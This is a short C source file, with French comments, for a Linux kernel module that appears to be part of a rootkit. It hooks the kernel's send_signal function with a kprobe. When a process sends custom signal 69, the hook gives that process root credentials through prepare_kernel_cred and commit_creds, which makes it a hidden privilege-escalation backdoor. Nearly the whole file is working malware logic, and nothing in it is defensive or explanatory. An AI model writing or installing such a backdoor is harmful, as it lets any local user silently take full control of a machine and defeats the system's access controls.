/*
 *
 * Ce script tente intercepte les signaux systèmes
 *
 */

#include "rootest.h"

#define CUSTOM_SIGNAL 69

int handle_signal_send(struct kprobe *kp, struct pt_regs *regs) {
    int sig = regs->di;
    
    if (sig == CUSTOM_SIGNAL) {
        struct cred *new_creds = prepare_kernel_cred(NULL);
        if (new_creds) {
            commit_creds(new_creds);
            printk(KERN_INFO "Elévation de privilèges pour le processus %d\n", current->pid);
        }
    }

    return 0;
}

struct kprobe sig_kp = {
    .symbol_name = "send_signal",
    .pre_handler = handle_signal_send,
};
